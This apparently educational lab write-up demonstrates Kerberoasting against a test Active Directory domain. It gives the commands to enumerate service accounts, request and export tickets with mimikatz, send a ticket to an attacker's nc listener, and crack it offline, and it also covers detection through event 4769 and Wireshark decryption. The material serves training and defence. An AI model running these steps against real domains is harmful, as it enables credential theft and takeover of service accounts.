[Credential Access]()

This lab explores the Kerberoasting attack - it allows any domain user to request kerberos tickets from TGS that are encrypted with NTLM hash of the plaintext password of a domain user account that is used as a service account (i.e account used for running an IIS service) and crack them offline avoiding AD account lockouts.

## Execution

Note the vulnerable domain member - a user account with `servicePrincipalName` attribute set, which is very important piece for kerberoasting - only user accounts with that property set are most likely susceptible to kerberoasting:

Attacker setting up an nc listener to receive a hash for cracking:

**attacker\@local**

```bash
nc -lvp 443 > kerberoast.bin
```



### Extracting the Ticket

Attacker enumerating user accounts with `serverPrincipalName` attribute set:

**attacker\@victim**

```powershell 
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```



![](assets/Kerberoasting-1.png)
Using only built-in powershell, we can extract the susceptible accounts with:

```Powershell
get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
```

![](assets/Kerberoasting-2.png)
It would have been better to use the following command provided by [Sean Metcalf](https://adsecurity.org/?p=2293) purely because of the `-filter` usage (quicker than `select-object`), but it did not work for me:

```powershell
get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
```

Another alternative working on Linux using [bloodyAD](https://github.com/CravateRouge/bloodyAD):

```python
python bloodyAD.py -u '$user' -p '$password' -d '$domain' --host '$host' get search --filter '(&(!(cn=krbtgt))(&(samAccountType=805306368)(servicePrincipalName=*)))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2
```

Additionally, user accounts with SPN set could be extracted with a native windows binary:

```bash
 setspn -T offense -Q */*
```

![](assets/Kerberoasting-3.png)
Attacker requesting a kerberos ticket (TGS) for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`- it gets stored in the memory:

{% code title="attacker\@victim" %}

```csharp
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
```

{% endcode %}

![](assets/Kerberoasting-4.png)
Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:

**attacker\@victim**

```csharp
mimikatz # kerberos::list /export
```



![](assets/Kerberoasting-5.png)
Attacker sends the exported service ticket to attacking machine for offline cracking:

**attacker\@victim**

```csharp
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
```


### Cracking the Ticket

Attacker brute forces the password of the service ticket:

**attacker\@local**

```csharp
python2 tgsrepcrack.py pwd kerberoast.bin
```

## Observations

Below is a security log `4769` showing service access being requested:

![](assets/Kerberoasting-7.png)
If you see `Add-event -AssemblyName SystemIdentityModel` (from advanced Powershell logging) followed by a windows security event `4769` immediately after that, you may be looking at an old school Kerberoasting, especially if ticket encryption type has a value `0x17` (23 decimal, meaning it's RC4 encrypted):

### Traffic

Below is the screenshot showing a request being sent to the `Ticket Granting Service` (TGS) for the service with a servicePrincipalName `HTTP/dc-mantvydas.offense.local` :

![](assets/Kerberoasting-9.png)
Below is the response from the TGS for the user `spotless` (we initiated this attack from offense\spotless) which contains the encrypted (RC4) kerberos ticket (server part) to access the `HTTP/dc-mantvydas.offense.local` service. It is the same ticket we cracked earlier with [tgsrepcrack.py](#cracking-the-ticket):

![](assets/Kerberoasting-10.png)
Out of curiosity, let's decrypt the kerberos ticket since we have the password the ticket was encrypted with.

Creating a kerberos keytab file for use in wireshark:

**attacker\@local**

```bash
root@~# ktutil 
ktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5
Password for HTTP/iis_svc@dc-mantvydas.offense.local: 
ktutil:  wkt /root/tools/iis.keytab
```


![](assets/Kerberoasting-11.png)
Adding the keytab to wireshark:

![](assets/Kerberoasting-12.png)
Note how the ticket's previously encrypted piece is now in plain text and we can see information pertinent to the requested ticket for a service `HTTP/dc-mantvydas.offense.local` :

![](assets/Kerberoasting-13.png)
### tgsrepcrack.py

Looking inside the code and adding a couple of print statements in key areas of the script, we can see that the password from the dictionary (`Passw0rd`) initially gets converted into an NTLM (`K0`) hash, then another key `K1` is derived from the initial hash and a message type, yet another key `K2` is derived from K1 and an MD5 digest of the encrypted data. Key `K2` is the actual key used to decrypt the encrypted ticket data:

I did not have to, but I also used an online RC4 decryptor tool to confirm the above findings:
